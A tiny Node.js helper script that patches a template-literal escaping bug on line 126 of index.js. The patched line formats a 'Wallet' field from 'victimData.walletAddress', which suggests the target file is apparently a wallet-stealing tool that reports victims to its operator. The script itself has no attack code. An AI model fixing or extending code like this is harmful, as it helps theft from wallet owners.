const fs = require('fs');
let content = fs.readFileSync('index.js', 'utf8');

// Fix line 126 - replace the problematic template literal
content = content.replace(
  '{ name: "👤 Wallet", value: ``${victimData.walletAddress}``, inline: false },',
  '{ name: "👤 Wallet", value: `\\`${victimData.walletAddress}\\``, inline: false },'
);

fs.writeFileSync('index.js', content);
console.log('✅ Fixed line 126');
